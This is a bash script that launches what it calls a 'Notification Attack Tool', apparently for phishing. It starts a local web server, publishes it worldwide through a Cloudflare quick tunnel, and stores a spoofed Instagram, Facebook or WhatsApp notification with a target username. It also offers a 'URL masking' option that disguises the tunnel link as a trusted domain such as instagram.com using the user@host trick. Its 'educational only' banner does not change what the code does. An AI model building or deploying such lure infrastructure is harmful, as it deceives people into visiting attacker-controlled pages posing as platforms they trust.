#!/bin/bash

# Define ANSI color codes
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
WHITE='\033[1;37m'
BOLD='\033[1m'
RESET='\033[0m'

export VERSION=2.0

banner() {
    echo -e "${PURPLE}"
    echo -e "╔═══════════════════════════════════════════╗"
    echo -e "║           ${RED}LOVE ❤ HACKER${PURPLE} PRESENTS         ║"
    echo -e "║        NOTIFICATION ATTACK TOOL          ║"
    echo -e "║         - WITH CLOUDFLARE TUNNEL -       ║"
    echo -e "║              EDUCATIONAL ONLY            ║"
    echo -e "╚═══════════════════════════════════════════╝"
    echo -e "${RESET}"
}

cleanup() {
    echo -e "\n${YELLOW}[!] Cleaning up...${RESET}"
    
    # Stop cloudflared
    if pgrep -f "cloudflared" > /dev/null; then
        pkill -f cloudflared
        echo -e "${GREEN}[+] Cloudflared stopped${RESET}"
    fi
    
    # Stop Python server
    if pgrep -f "python" > /dev/null; then
        pkill -f python
        echo -e "${GREEN}[+] Python server stopped${RESET}"
    fi
    
    # Stop gunicorn
    if pgrep -f "gunicorn" > /dev/null; then
        pkill -f gunicorn
        echo -e "${GREEN}[+] Gunicorn stopped${RESET}"
    fi
    
    exit 0
}

trap cleanup SIGINT

check_dependencies() {
    echo -e "\n${YELLOW}[+] Checking dependencies...${RESET}"
    
    # Check Python
    if ! command -v python3 &> /dev/null; then
        echo -e "${RED}[!] Python3 not found. Installing...${RESET}"
        pkg install python -y
    fi
    
    # Check pip
    if ! command -v pip &> /dev/null; then
        echo -e "${RED}[!] pip not found. Installing...${RESET}"
        pkg install python-pip -y
    fi
    
    # Check cloudflared
    if ! command -v cloudflared &> /dev/null; then
        echo -e "${RED}[!] Cloudflared not found. Installing...${RESET}"
        pkg install wget -y
        wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64
        chmod +x cloudflared-linux-arm64
        mv cloudflared-linux-arm64 $PREFIX/bin/cloudflared
    fi
    
    # Check jq
    if ! command -v jq &> /dev/null; then
        echo -e "${RED}[!] jq not found. Installing...${RESET}"
        pkg install jq -y
    fi
    
    echo -e "${GREEN}[+] All dependencies checked${RESET}"
}

install_python_deps() {
    echo -e "\n${YELLOW}[+] Installing Python dependencies...${RESET}"
    pip install flask requests gunicorn
    echo -e "${GREEN}[+] Python dependencies installed${RESET}"
}

create_icons_folder() {
    if [ ! -d "icons" ]; then
        mkdir icons
        echo -e "${GREEN}[+] Created icons folder${RESET}"
    fi
}

start_local_server() {
    local port=$1
    echo -e "\n${YELLOW}[+] Starting local server on port $port...${RESET}"
    python web_app.py &
    sleep 3
    echo -e "${GREEN}[✅] Local server started${RESET}"
    echo -e "${CYAN}[🌐] Local URL: http://127.0.0.1:$port${RESET}"
}

start_cloudflared_tunnel() {
    local port=$1
    echo -e "\n${YELLOW}[+] Starting Cloudflare tunnel...${RESET}"
    
    # Start cloudflared
    cloudflared tunnel --url http://localhost:$port > /dev/null 2>&1 &
    CLOUDFLARED_PID=$!
    sleep 5
    
    # Get tunnel URL
    local tunnel_url=$(curl -s http://localhost:55555/quicktunnel 2>/dev/null | jq -r '.url' 2>/dev/null)
    
    if [ -z "$tunnel_url" ] || [ "$tunnel_url" == "null" ]; then
        # Alternative method to get URL
        sleep 3
        tunnel_url=$(cloudflared tunnel --url http://localhost:$port 2>&1 | grep -o 'https://[^ ]*\.trycloudflare.com' | head -1)
    fi
    
    if [ -n "$tunnel_url" ] && [ "$tunnel_url" != "null" ]; then
        echo -e "${GREEN}[✅] Cloudflare tunnel started${RESET}"
        echo -e "${CYAN}[🌐] Public URL: $tunnel_url${RESET}"
        echo "$tunnel_url"
    else
        echo -e "${RED}[!] Failed to get Cloudflare URL${RESET}"
        echo ""
    fi
}

mask_url() {
    local original_url=$1
    echo -e "\n${YELLOW}[?] Do you want to mask the URL? (y/n): ${RESET}"
    read mask_choice
    
    if [[ $mask_choice == "y" || $mask_choice == "Y" ]]; then
        echo -e "${YELLOW}[?] Enter custom domain (e.g., instagram.com): ${RESET}"
        read custom_domain
        custom_domain=${custom_domain:-"instagram-login.com"}
        
        # Simple URL masking
        local masked_url="https://${custom_domain}@${original_url#https://}"
        echo -e "${GREEN}[✅] URL masked successfully${RESET}"
        echo -e "${CYAN}[🎭] Masked URL: $masked_url${RESET}"
        echo "$masked_url"
    else
        echo "$original_url"
    fi
}

select_platform() {
    echo -e "\n${WHITE}Select Platform:${RESET}"
    echo -e "${GREEN}1. Instagram${RESET}"
    echo -e "${BLUE}2. Facebook${RESET}"
    echo -e "${PURPLE}3. WhatsApp${RESET}"
    echo -e "${CYAN}4. Custom${RESET}"
    
    while true; do
        echo -e -n "\n${YELLOW}[?] Enter choice (1-4): ${RESET}"
        read platform_choice
        
        case $platform_choice in
            1)
                platform="Instagram"
                break
                ;;
            2)
                platform="Facebook"
                break
                ;;
            3)
                platform="WhatsApp"
                break
                ;;
            4)
                echo -e -n "${YELLOW}[?] Enter custom platform name: ${RESET}"
                read platform
                break
                ;;
            *)
                echo -e "${RED}[!] Invalid choice! Please enter 1-4${RESET}"
                ;;
        esac
    done
    
    echo "$platform"
}

get_user_input() {
    local platform=$1
    
    echo -e -n "\n${YELLOW}[?] Enter username: ${RESET}"
    read username
    
    echo -e -n "${YELLOW}[?] Enter redirect URL: ${RESET}"
    read redirect_url
    
    if [ -z "$redirect_url" ]; then
        redirect_url="https://example.com"
    fi
    
    # Create notification data file
    cat > notification_data.json << EOF
{
    "platform": "$platform",
    "username": "$username",
    "redirect_url": "$redirect_url",
    "icon_url": "/icons/${platform,,}.png"
}
EOF
    
    echo -e "${GREEN}[✅] Notification data saved${RESET}"
}

select_tunnel_method() {
    echo -e "\n${WHITE}Select Tunnel Method:${RESET}"
    echo -e "${GREEN}1. Localhost Only${RESET}"
    echo -e "${BLUE}2. Cloudflare Tunnel${RESET}"
    echo -e "${CYAN}3. Cloudflare + URL Masking${RESET}"
    
    while true; do
        echo -e -n "\n${YELLOW}[?] Enter choice (1-3): ${RESET}"
        read method_choice
        
        case $method_choice in
            1|2|3)
                break
                ;;
            *)
                echo -e "${RED}[!] Invalid choice! Please enter 1-3${RESET}"
                ;;
        esac
    done
    
    echo "$method_choice"
}

main() {
    clear
    banner
    
    echo -e "${YELLOW}[!] Educational Purpose Only${RESET}"
    echo -e "${YELLOW}[!] Use only on devices you own${RESET}"
    
    # Check dependencies
    check_dependencies
    
    # Install Python dependencies
    install_python_deps
    
    # Create icons folder
    create_icons_folder
    
    # Select platform
    platform=$(select_platform)
    
    # Get user input
    get_user_input "$platform"
    
    # Select tunnel method
    method=$(select_tunnel_method)
    
    # Set port
    port=8080
    
    # Start local server
    start_local_server $port
    
    case $method in
        1)
            # Localhost only
            echo -e "\n${GREEN}[✅] Setup Complete!${RESET}"
            echo -e "${CYAN}[📱] Local URL: http://127.0.0.1:$port${RESET}"
            echo -e "${YELLOW}[!] Only accessible on this device${RESET}"
            ;;
        2)
            # Cloudflare tunnel
            tunnel_url=$(start_cloudflared_tunnel $port)
            if [ -n "$tunnel_url" ]; then
                echo -e "\n${GREEN}[✅] Setup Complete!${RESET}"
                echo -e "${CYAN}[🌐] Public URL: $tunnel_url${RESET}"
                echo -e "${YELLOW}[!] Accessible worldwide${RESET}"
            fi
            ;;
        3)
            # Cloudflare + URL masking
            tunnel_url=$(start_cloudflared_tunnel $port)
            if [ -n "$tunnel_url" ]; then
                masked_url=$(mask_url "$tunnel_url")
                echo -e "\n${GREEN}[✅] Setup Complete!${RESET}"
                echo -e "${CYAN}[🌐] Public URL: $tunnel_url${RESET}"
                echo -e "${CYAN}[🎭] Masked URL: $masked_url${RESET}"
                echo -e "${YELLOW}[!] Accessible worldwide with masking${RESET}"
            fi
            ;;
    esac
    
    echo -e "\n${RED}[!] Press Ctrl+C to stop the server${RESET}"
    
    # Keep running
    while true; do
        sleep 1
    done
}

# Run main function
main
